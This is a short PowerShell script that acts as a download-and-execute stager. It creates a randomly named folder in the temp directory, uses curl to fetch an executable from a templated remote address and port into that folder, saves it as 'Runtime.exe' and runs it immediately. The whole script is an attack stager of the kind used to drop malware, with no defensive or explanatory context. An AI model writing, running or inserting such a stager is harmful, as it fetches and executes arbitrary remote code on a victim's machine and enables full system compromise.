$folder = get-random -count 15 -input (46..46 + 48..57 + 65..90 + 97..122) | % -begin { $aa = $null }  -process {$aa += [char]$_} ` -end {$aa}
$folder = "$env:tmp/$folder"

echo $folder
mkdir $folder

echo "$folder\Runtime.exe"
curl http://{address}:{port}/exec -o "$folder/Runtime.exe"

& $folder/Runtime.exe